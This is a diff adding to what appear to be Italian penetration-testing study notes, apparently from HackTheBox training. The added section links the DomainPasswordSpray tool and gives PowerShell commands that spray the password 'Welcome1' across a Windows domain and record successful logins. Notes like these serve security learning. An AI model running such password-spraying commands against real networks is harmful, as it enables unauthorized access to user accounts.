@@ -313,3 +313,14 @@ If we find a desktop host with the local administrator account password set to s
 
 la flag **--local-auth** specifica di provare il login solo una volta per macchina. Questo e' MOLTO IMPORTANTE.
 
+
+
+# Internal password spraying from Windows
+scarica  https://github.com/dafthack/DomainPasswordSpray
+
+### Usare DomainPasswordSpray
+```
+PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
+PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
